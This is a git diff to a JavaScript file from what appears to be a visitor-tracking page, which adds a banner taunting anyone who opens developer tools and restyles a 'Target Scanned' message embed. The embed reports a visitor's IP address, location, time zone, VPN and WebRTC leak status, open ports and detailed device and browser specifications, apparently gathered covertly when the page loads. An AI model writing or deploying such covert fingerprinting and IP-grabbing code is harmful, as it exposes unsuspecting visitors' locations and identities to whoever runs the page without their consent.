@@ -1,3 +1,16 @@
+// Congrats on using F12. It's too late but don't worry - we're the good guys.
+//
+// Follow the Discord link to join us.
+// This project is open source and can be found at https://github.com/RocketGod-git/thepiratesplunder 
+//
+// __________                  __             __     ________             .___ 
+// \______   \  ____    ____  |  | __  ____ _/  |_  /  _____/   ____    __| _/ 
+//  |       _/ /  _ \ _/ ___\ |  |/ /_/ __ \\   __\/   \  ___  /  _ \  / __ |  
+//  |    |   \(  <_> )\  \___ |    < \  ___/ |  |  \    \_\  \(  <_> )/ /_/ |  
+//  |____|_  / \____/  \___  >|__|_ \ \___  >|__|   \______  / \____/ \____ |  
+//         \/              \/      \/     \/               \/              \/  
+
+
 async function main() {
     try {
         const response = await fetch('config.json');
@@ -337,97 +350,32 @@ async function main() {
                 }
             
                 var embeds = [{
-                    "title": "Target Scanned",
+                    "title": "🎯 Target Scanned",
                     "color": 65280,
                     "fields": [
                         {
-                            "name": "IP Address",
-                            "value": _location_.ip ? _location_.ip : "Unknown",
-                            "inline": true
+                            "name": "📱 **Device Information**",
+                            "value": `IP Address: [${_location_.ip ? _location_.ip : "Unknown"}](http://${_location_.ip})\nIP Address Location: ${gpsValue ? gpsValue : "Unknown"}\nTime Zone: ${userTimezone ? userTimezone : "Unknown"}\nTime Zone vs IP Location: ${vpnMessage ? vpnMessage : "Unknown"}`,
+                            "inline": false
                         },
                         {
-                            "name": "Location",
-                            "value": `${_location_.city}, ${_location_.region}, ${_location_.country_name}`,
-                            "inline": true
+                            "name": "💾 **System Specifications**",
+                            "value": `Device Type: ${additionalDetails.deviceType ? additionalDetails.deviceType : "Unknown"}\nOperating System: ${systemDetails.operatingSystem ? systemDetails.operatingSystem : "Unknown"}\nBrowser & Version: ${systemDetails.browser ? systemDetails.browser : 'Unknown'} ${additionalDetails.browserVersion ? additionalDetails.browserVersion : 'Unknown'}\nGPU: ${gpuValue ? gpuValue : "Unknown"}\nScreen Resolution: ${screenResolution ? screenResolution : "Unknown"}`,
+                            "inline": false
                         },
                         {
-                            "name": "IP Location",
-                            "value": gpsValue ? gpsValue : "Unknown",
-                            "inline": true
+                            "name": "🔒 **Security and Privacy**",
+                            "value": `VPN Detection: ${isVpn ? "🛡️ VPN Detected" : "Unknown"}\nWebRTC Leak Status: ${webrtcResult ? webrtcResult : "Unknown"}\nPort Status: ${portStatusString ? portStatusString : "Unknown"}\nDo Not Track: ${additionalDetails.doNotTrack === '1' ? "On" : additionalDetails.doNotTrack === '0' ? "Off" : "Unknown"}`,
+                            "inline": false
                         },
                         {
-                            "name": "GPU",
-                            "value": gpuValue ? gpuValue : "Unknown",
-                            "inline": true
-                        },
-                        {
-                            "name": "Operating System",
-                            "value": systemDetails.operatingSystem ? systemDetails.operatingSystem : "Unknown",
-                            "inline": true
-                        },
-                        {
-                            "name": "Browser",
-                            "value": (systemDetails.browser ? systemDetails.browser : "Unknown") + " " + (additionalDetails.browserVersion ? additionalDetails.browserVersion : "Unknown"),
-                            "inline": true
-                        },
-                        {
-                            "name": "Screen Resolution",
-                            "value": screenResolution ? screenResolution : "Unknown",
-                            "inline": true
-                        },
-                        {
-                            "name": "Referrer",
-                            "value": referrer ? referrer : "Unknown",
-                            "inline": true
-                        },
-                        {
-                            "name": "Time Zone",
-                            "value": userTimezone ? userTimezone : "Unknown",
-                            "inline": true
-                        },
-                        {
-                            "name": "Language",
-                            "value": language ? language : "Unknown",
-                            "inline": true
-                        },
-                        {
-                            "name": "Device Type",
-                            "value": additionalDetails.deviceType ? additionalDetails.deviceType : "Unknown",
-                            "inline": true
-                        },
-                        {
-                            "name": "Browser Version",
-                            "value": additionalDetails.browserVersion ? additionalDetails.browserVersion : "Unknown",
-                            "inline": true
-                        },
-                        {
-                            "name": "Connection Type",
-                            "value": additionalDetails.connectionType ? additionalDetails.connectionType : "Unknown",
-                            "inline": true
-                        },
-                        {
-                            "name": "Do Not Track",
-                            "value": additionalDetails.doNotTrack ? additionalDetails.doNotTrack : "Unknown",
-                            "inline": true
-                        },
-                        {
-                            "name": "Time Zone vs IP Location",
-                            "value": vpnMessage ? vpnMessage : "Unknown",
-                            "inline": true
-                        },
-                        {
-                            "name": "WebRTC Leak Status",
-                            "value": webrtcResult ? webrtcResult : "Unknown",
-                            "inline": true
-                        },
-                        {
-                            "name": "Port Status",
-                            "value": portStatusString,
-                            "inline": true
+                            "name": "🔎 **Additional Details**",
+                            "value": `Referrer: ${referrer ? referrer : "Unknown"}\nLanguage: ${language ? language : "Unknown"}\nConnection Type: ${additionalDetails.connectionType ? additionalDetails.connectionType : "Unknown"}`,
+                            "inline": false
                         }
                     ]
                 }];
-
+                
                 if (_location_.region === null){
                     if (embeds[0] && embeds[0].fields) { //overloaded once
                         for (let i = 0; i < embeds[0].fields.length; i++) {
